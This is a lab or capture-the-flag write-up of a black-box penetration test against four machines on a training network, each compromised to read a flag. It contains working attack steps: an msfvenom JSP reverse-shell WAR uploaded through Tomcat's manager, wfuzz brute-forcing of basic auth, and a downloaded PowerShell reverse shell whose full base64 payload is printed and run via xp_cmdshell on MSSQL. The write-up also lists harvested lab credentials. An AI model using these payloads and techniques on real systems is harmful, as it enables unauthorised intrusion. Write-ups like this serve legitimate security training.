---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Test #1

## Prework

### Connect to VPN

```bash
sudo openvpn black-box-penetration-test-1.ovpn
```

### Scan network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap &&
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt &&
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml &&
nmap2md.sh portScan.xml | xclip
```

## Scanner

> Generated on **Sun Jul 11 13:40:33 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
```

## Hosts Alive (4)

| Host          | OS                   | Accuracy |
| ------------- | -------------------- | -------- |
| 172.16.64.101 | Linux 3.12           | 95%      |
| 172.16.64.140 | Linux 3.12           | 95%      |
| 172.16.64.182 | Linux 3.12           | 95%      |
| 172.16.64.199 | Microsoft Windows 10 | 96%      |

## Open Ports and Running Services

### ✔️172.16.64.101 (Linux 3.12 - 95%)

| Port      | State | Service | Version                             |
| --------- | ----- | ------- | ----------------------------------- |
| 22/tcp    | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8     |
| 8080/tcp  | open  | http    | Apache Tomcat/Coyote JSP engine 1.1 |
| 9080/tcp  | open  | http    | Apache Tomcat/Coyote JSP engine 1.1 |
| 59919/tcp | open  | http    | Apache httpd 2.4.18                 |

{% tabs %}
{% tab title="Dirbuster" %}
* Target URL: [http://172.16.64.101:8080](http://172.16.64.101:8080)
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Jul 21 17:35:09 EDT 2021
--------------------------------

http://172.16.64.101:8080
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/

Dirs found with a 302 response:

/manager/

Dirs found with a 401 response:

/manager/html/
/manager/text/
/manager/status/


--------------------------------
--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Trying to access unsuccessfully for a couple of times will get you redirected to [**http://172.16.64.101:8080/manager/html**](http://172.16.64.101:8080/manager/html), where the following information is shown:

```
<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```

[**http://172.16.64.101:8080/manager/html**](http://172.16.64.101:8080/manager/html) **** allows you to upload a war file.
{% endhint %}

{% tabs %}
{% tab title="Generate your reverse shell with msfvenom" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=1234 -f war > shell.war
```
{% endtab %}

{% tab title="ncat listener" %}
```bash
nc -lvp 1234
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
**Flag encountered!**

```bash
tomcat8@xubuntu:/home/developer$ cat flag.txt
Congratulations, you got it!
tomcat8@xubuntu:/home/adminels/Desktop$ cat flag.txt 
You did it!
```
{% endhint %}

### ✔️172.16.64.140 (Linux 3.12 - 95%)

| Port   | State | Service | Version             |
| ------ | ----- | ------- | ------------------- |
| 80/tcp | open  | http    | Apache httpd 2.4.18 |

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://172.16.64.140](http://172.16.64.140/project)
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Jul 21 18:08:17 EDT 2021
--------------------------------

http://172.16.64.140:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/css/
/img/

Dirs found with a 401 response:

/project/

Dirs found with a 403 response:

/icons/
/project/includes/
/icons/small/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/css/style.css


--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
**Found potential relevant information at** [**http://172.16.64.140/project**](http://172.16.64.140/project)**!**

However, such information is protected under basic authentication.
{% endhint %}

{% tabs %}
{% tab title="wfuzz basic auth" %}
```bash
wfuzz -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -c --basic FUZZ:FUZZ http://172.16.64.140/project 
```
{% endtab %}

{% tab title="Output" %}
```bash
$ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.64.140/project
Total requests: 17

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000001:   401        14 L     54 W       460 Ch      "root - root"                                                                               
000000003:   401        14 L     54 W       460 Ch      "test - test"                                                                               
000000007:   401        14 L     54 W       460 Ch      "mysql - mysql"                                                                             
000000015:   401        14 L     54 W       460 Ch      "ec2-user - ec2-user"                                                                       
000000014:   401        14 L     54 W       460 Ch      "ansible - ansible"                                                                         
000000017:   401        14 L     54 W       460 Ch      "azureuser - azureuser"                                                                     
000000016:   401        14 L     54 W       460 Ch      "vagrant - vagrant"                                                                         
000000006:   401        14 L     54 W       460 Ch      "adm - adm"                                                                                 
000000012:   401        14 L     54 W       460 Ch      "pi - pi"                                                                                   
000000013:   401        14 L     54 W       460 Ch      "puppet - puppet"                                                                           
000000011:   401        14 L     54 W       460 Ch      "ftp - ftp"                                                                                 
000000010:   401        14 L     54 W       460 Ch      "oracle - oracle"                                                                           
000000008:   401        14 L     54 W       460 Ch      "user - user"                                                                               
000000009:   401        14 L     54 W       460 Ch      "administrator - administrator"                                                             
000000002:   301        9 L      28 W       316 Ch      "admin - admin"                                                                             
000000004:   401        14 L     54 W       460 Ch      "guest - guest"                                                                             
000000005:   401        14 L     54 W       460 Ch      "info - info"                                                                               

Total time: 0.566855
Processed Requests: 17
Filtered Requests: 0
Requests/sec.: 29.99000

```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Discovered credentials to access** [**http://172.16.64.140/project**](http://172.16.64.140/project) **through \`wfuzz\`!**

* &#x20;**** [**http://172.16.64.140/project**](http://172.16.64.140/project) **** is accessible through basic authentication with `admin:admin` credentials, as `301` status code is a redirection.

Let's run `dirbuster`again against the new scope.
{% endhint %}

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://172.16.64.140/project](http://172.16.64.140/project)
* Use HTTP Authentication
  * Username: admin
  * Password: admin
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Jul 21 18:34:13 EDT 2021
--------------------------------

http://172.16.64.140:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/img/
/css/
/project/
/project/images/
/project/css/
/project/backup/
/project/backup/images/
/project/backup/css/
/project/backup/test/
/project/backup/backup/

Dirs found with a 403 response:

/icons/
/icons/small/
/project/includes/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/css/style.css
/project/index.html
/project/about.html
/project/services.html
/project/solutions.html
/project/blog.html
/project/support.html
/project/contact.html
/project/css/ie.css
/project/css/style.css
/project/backup/index.html
/project/backup/about.html
/project/backup/services.html
/project/backup/solutions.html
/project/backup/support.html
/project/backup/blog.html
/project/backup/contact.html
/project/backup/css/ie.css
/project/backup/css/style.css
/project/backup/test/asdasd.txt
/project/backup/test/dsadasda.txt
/project/backup/test/sdadas.txt
/project/backup/test/test1.txt
/project/backup/test/todo.txt
/project/backup/backup/index.html
/project/backup/backup/about.html
/project/backup/backup/services.html
/project/backup/backup/solutions.html
/project/backup/backup/support.html
/project/backup/backup/blog.html
/project/backup/backup/contact.html


--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**Found relevant info!**

On this url we find the following connection parameters for a SQL database server: [**http://172.16.64.140:80/project/backup/test/sdadas.txt**](http://172.16.64.140/project/backup/test/sdadas.txt):

```
Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt
```
{% endhint %}

{% hint style="success" %}
**Flag encountered!**

Under [**http://172.16.64.140/project/354253425234234/flag.txt**](http://172.16.64.140/project/354253425234234/flag.txt) we find the following content:

```
Congratulations, you exploited this machine!
Now continue to others.
```
{% endhint %}

### ✔️172.16.64.182 (Linux 3.12 - 95%)

| Port   | State | Service | Version                         |
| ------ | ----- | ------- | ------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

{% hint style="warning" %}
**The credentials we discovered while exploring 172.16.64.199 (Windows machine) do work!**

```bash
sshpass -p dF3334slKw ssh developer@172.16.64.182
```
{% endhint %}

{% hint style="success" %}
**Flag encountered**!

```
sshpass -p dF3334slKw ssh developer@172.16.64.182
developer@xubuntu:~$ find . | grep flag
developer@xubuntu:~$ cat flag.txt 
Congratulations, you got it!
```
{% endhint %}

### ✔️172.16.64.199 (Microsoft Windows 10 - 96%)

| Port      | State | Service      | Version                                      |
| --------- | ----- | ------------ | -------------------------------------------- |
| 135/tcp   | open  | msrpc        | Microsoft Windows RPC                        |
| 139/tcp   | open  | netbios-ssn  | Microsoft Windows netbios-ssn                |
| 445/tcp   | open  | microsoft-ds |                                              |
| 1433/tcp  | open  | ms-sql-s     | Microsoft SQL Server 2014 12.00.2000.00; RTM |
| 49664/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49665/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49666/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49667/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49668/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49669/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49670/tcp | open  | msrpc        | Microsoft Windows RPC                        |
| 49943/tcp | open  | ms-sql-s     | Microsoft SQL Server 2014 12.00.2000         |

{% tabs %}
{% tab title="Preparing Reverse Shell for MS SQL Server" %}
```bash
# Grab payload
wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;

# Substitute ip and port
sed -i 's/127.0.0.1/172.16.64.10/; s/413/1234/' mini-reverse.ps1;

# Encode payload
cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3 | base64 -w 0 > encoded_payload;

# We'll use this payload in our shell
cat encoded_payload 
```
{% endtab %}

{% tab title="Output Revshell" %}
```
JABzAG8AYwBrAGUAdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgA2ADQALgAxADAAJwAsACAAMQAyADMANAApADsACgBpAGYAKAAkAHMAbwBjAGsAZQB0ACAALQBlAHEAIAAkAG4AdQBsAGwAKQB7AGUAeABpAHQAIAAxAH0ACgAkAHMAdAByAGUAYQBtACAAPQAgACQAcwBvAGMAawBlAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAKACQAdwByAGkAdABlAHIAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHMAdAByAGUAYQBtACkAOwAKACQAYgB1AGYAZgBlAHIAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AQgB5AHQAZQBbAF0AIAAxADAAMgA0ADsACgAkAGUAbgBjAG8AZABpAG4AZwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBzAGMAaQBpAEUAbgBjAG8AZABpAG4AZwA7AAoAZABvAAoAewAKAAkAJAB3AHIAaQB0AGUAcgAuAEYAbAB1AHMAaAAoACkAOwAKAAkAJAByAGUAYQBkACAAPQAgACQAbgB1AGwAbAA7AAoACQAkAHIAZQBzACAAPQAgACIAIgAKAAkAdwBoAGkAbABlACgAJABzAHQAcgBlAGEAbQAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAIAAtAG8AcgAgACQAcgBlAGEAZAAgAC0AZQBxACAAJABuAHUAbABsACkAIAB7AAoACQAJACQAcgBlAGEAZAAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB1AGYAZgBlAHIALAAgADAALAAgADEAMAAyADQAKQAKAAkAfQAKAAkAJABvAHUAdAAgAD0AIAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJAByAGUAYQBkACkALgBSAGUAcABsAGEAYwBlACgAIgBgAHIAYABuACIALAAiACIAKQAuAFIAZQBwAGwAYQBjAGUAKAAiAGAAbgAiACwAIgAiACkAOwAKAAkAaQBmACgAIQAkAG8AdQB0AC4AZQBxAHUAYQBsAHMAKAAiAGUAeABpAHQAIgApACkAewAKAAkACQAkAGEAcgBnAHMAIAA9ACAAIgAiADsACgAJAAkAaQBmACgAJABvAHUAdAAuAEkAbgBkAGUAeABPAGYAKAAnACAAJwApACAALQBnAHQAIAAtADEAKQB7AAoACQAJAAkAJABhAHIAZwBzACAAPQAgACQAbwB1AHQALgBzAHUAYgBzAHQAcgBpAG4AZwAoACQAbwB1AHQALgBJAG4AZABlAHgATwBmACgAJwAgACcAKQArADEAKQA7AAoACQAJAAkAJABvAHUAdAAgAD0AIAAkAG8AdQB0AC4AcwB1AGIAcwB0AHIAaQBuAGcAKAAwACwAJABvAHUAdAAuAEkAbgBkAGUAeABPAGYAKAAnACAAJwApACkAOwAKAAkACQAJAGkAZgAoACQAYQByAGcAcwAuAHMAcABsAGkAdAAoACcAIAAnACkALgBsAGUAbgBnAHQAaAAgAC0AZwB0ACAAMQApAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcABpAG4AZgBvACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcABpAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACIAYwBtAGQALgBlAHgAZQAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHAAaQBuAGYAbwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQARQByAHIAbwByACAAPQAgACQAdAByAHUAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABwAGkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ACAAPQAgACQAdAByAHUAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABwAGkAbgBmAG8ALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAgAD0AIAAkAGYAYQBsAHMAZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABwAGkAbgBmAG8ALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIAAiAC8AYwAgACQAbwB1AHQAIAAkAGEAcgBnAHMAIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABwACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcAAuAFMAdABhAHIAdABJAG4AZgBvACAAPQAgACQAcABpAG4AZgBvAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHAALgBTAHQAYQByAHQAKAApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABwAC4AVwBhAGkAdABGAG8AcgBFAHgAaQB0ACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAZABvAHUAdAAgAD0AIAAkAHAALgBTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AGQAZQByAHIAIAA9ACAAJABwAC4AUwB0AGEAbgBkAGEAcgBkAEUAcgByAG8AcgAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAHAALgBFAHgAaQB0AEMAbwBkAGUAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwAgAD0AIAAkAHMAdABkAGUAcgByAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwAgAD0AIAAkAHMAdABkAG8AdQB0AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoACQAJAAkAfQAKAAkACQAJAGUAbABzAGUAewAKAAkACQAJAAkAJAByAGUAcwAgAD0AIAAoACYAIgAkAG8AdQB0ACIAIAAiACQAYQByAGcAcwAiACkAIAB8ACAAbwB1AHQALQBzAHQAcgBpAG4AZwA7AAoACQAJAAkAfQAKAAkACQB9AAoACQAJAGUAbABzAGUAewAKAAkACQAJACQAcgBlAHMAIAA9ACAAKAAmACIAJABvAHUAdAAiACkAIAB8ACAAbwB1AHQALQBzAHQAcgBpAG4AZwA7AAoACQAJAH0ACgAJAAkAaQBmACgAJAByAGUAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAKACAAIAAgACAAIAAgACAAIAAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlAEwAaQBuAGUAKAAkAHIAZQBzACkACgAgACAAIAAgAH0ACgAJAH0ACgB9AFcAaABpAGwAZQAgACgAIQAkAG8AdQB0AC4AZQBxAHUAYQBsAHMAKAAiAGUAeABpAHQAIgApACkACgAkAHcAcgBpAHQAZQByAC4AYwBsAG8AcwBlACgAKQA7AAoAJABzAG8AYwBrAGUAdAAuAGMAbABvAHMAZQAoACkAOwAKACQAcwB0AHIAZQBhAG0ALgBEAGkAcwBwAG8AcwBlACgAKQA=
```
{% endtab %}

{% tab title="netcat listener" %}
```bash
# Leave nc opened in one terminal
nc -l 1234
```
{% endtab %}

{% tab title="Connect to database/inject revshell" %}
```bash
# Connect to database server and inject reverse shell via powershell
mssql-cli -S 172.16.64.199 -U fooadmin -P fooadmin
> enable_xp_cmdshell
> RECONFIGURE
> xp_cmdshell whoami
> xp_cmdshell powershell -e <payload_from_previous_step>
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
**Flag encountered!**

```
cd c:\
where /r c:\ flag.txt
cd c:\Users\AdminELS\Desktop\
cat flag.txt
Congratulations! You exploited this machine! 
```
{% endhint %}

{% hint style="warning" %}
`ssh://developer:dF3334slKw@172.16.64.182:22` **seems like a ssh connection string in a \`id\_rsa.pub\` file**

```
PS C:\Users\AdminELS\Desktop> cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22############################################################################################################################################################################################
```
{% endhint %}
